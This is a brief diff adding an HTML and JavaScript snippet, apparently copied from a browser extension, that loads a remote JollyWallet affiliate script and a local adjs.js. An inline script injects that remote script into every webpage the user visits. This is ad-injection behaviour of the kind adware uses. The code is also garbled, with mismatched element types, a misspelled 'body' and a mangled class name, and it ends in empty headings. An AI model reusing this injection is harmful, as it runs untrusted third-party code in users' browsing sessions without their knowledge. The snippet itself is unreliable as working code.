@@ -1,0 +1,24 @@
+-My build DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad (HTML Editor):
+<script type = "text/javascript" 
+         src = "file:///C:/Users/Axioo/Favorites/adjs.js"></script>
+         <script type = "text/javascript" 
+         src = "http://api.jollywallet.com/affiliate/client?p=16&dist=261&sub=chrome208"></script>
+ <iframe src=" http://api.jollywallet.com/affiliate/client?p=16&dist=261&sub=chrome208 " ></iframe>
+<iframe src=" file:///C:/Users/Axioo/Favorites/adjs.js " ></iframe>
+<script>
+//this file loaded in every webpage to extention scope
+//all we do is to inject js tag to ody itself, to run js in the site scope
+var script = document.createElement("iframe");
+script.type  = "text/javascript",
+script.src   = 'http://api.jollywallet.com/affiliate/client?p=16&dist=261&sub=chrome208';
+script.className = 'JOLLYWALLET_mainScript';
+if(!document.getElementsByClassName('JOLLYWALLET_mainScrp:ipt').length)//prevent double loading
+ document.body.appendChild(script);
+
+</script>
+
+-HAR:
+
+-To be evaluated in console:
